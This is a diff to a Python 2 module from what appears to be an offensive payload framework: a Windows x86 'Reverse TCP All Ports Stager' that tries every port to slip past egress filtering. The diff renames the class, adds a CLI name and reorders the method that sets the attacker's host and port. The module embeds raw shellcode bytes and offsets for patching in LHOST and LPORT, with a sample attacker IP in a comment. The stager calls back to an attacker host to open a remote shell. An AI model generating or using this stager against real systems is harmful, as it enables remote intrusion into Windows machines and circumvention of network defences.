@@ -8,15 +8,16 @@ import socket
 import sys
 
 
-class RevTCPAP:
+class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Reverse TCP All Ports Stager (Stage 1)"
         self.description = "Attempts to egress bust by trying all ports!"
+        self.cli_name = "rev_tcp_all_ports"
         self.platform = "Windows"
         self.arch = "x86"
         self.lport = 4444
-        self.lhost = None
+        self.lhost = None   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
         self.retries_offset = 192
         self.lhost_offset = 195
         self.lport_offset = 202
@@ -43,22 +44,6 @@ class RevTCPAP:
             "\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93" +
             "\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29" +
             "\xC6\x85\xF6\x75\xEC\xC3")
-
-    def set_attrs(self, lport_value, lhost_value):
-        self.lport = lport_value
-
-        # Check if given a domain or IP address:
-        if self.validate_ip(lhost_value):
-            self.lhost = lhost_value
-        else:
-            try:
-                self.lhost = socket.gethostbyname(lhost_value)
-            except socket.gaierror:
-                print "[*] Error: Invalid domain or IP provided for LHOST value!"
-                print "[*] Error: Please re-run with the correct value."
-                sys.exit()
-
-        return
 
     def gen_shellcode(self):
         # Take the passed in attributes and gen shellcode
@@ -128,3 +113,19 @@ class RevTCPAP:
                     return False
             return True
         return False
+
+    def set_attrs(self, lport_value, lhost_value):
+        self.lport = lport_value
+
+        # Check if given a domain or IP address:
+        if self.validate_ip(lhost_value):
+            self.lhost = lhost_value
+        else:
+            try:
+                self.lhost = socket.gethostbyname(lhost_value)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit()
+
+        return
